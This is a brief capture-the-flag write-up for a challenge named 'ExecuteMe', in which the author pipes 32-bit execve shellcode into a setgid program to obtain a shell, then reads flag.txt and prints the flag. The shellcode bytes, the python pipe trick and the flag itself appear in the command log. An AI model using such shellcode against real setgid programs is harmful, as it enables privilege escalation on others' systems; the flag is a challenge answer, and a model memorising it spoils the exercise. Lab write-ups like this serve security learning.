# ExecuteMe - 80

```
This program will run whatever you send to it! 
Try to get the flag! The binary can be found at /home/execute/ on the shell server. 
The source can be found here.
```

Later, I found out that giving the shellcode directly does not work because it does not understnad the hex right. 
I had to use print instead to pipe it into the execute.

```
pico15664@shell:/home/execute$ file execute
execute: setgid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=d16192a7ec6042bae92a729790cb5fd22d7f0d3d, not stripped
pico15664@shell:/home/execute$ ./execute
\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80
Segmentation fault (core dumped)
	
pico15664@shell:/home/execute$ (python -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'") | ./execute

pico15664@shell:/home/execute$ (python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'";ls) | ./execute

pico15664@shell:/home/execute$ (python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'";cat ) | ./execute
ls
Makefile   core       execute	 execute.c  flag.txt
cat flag.txt
shellcode_is_kinda_cool
```

```
Flag:shellcode_is_kinda_cool
```
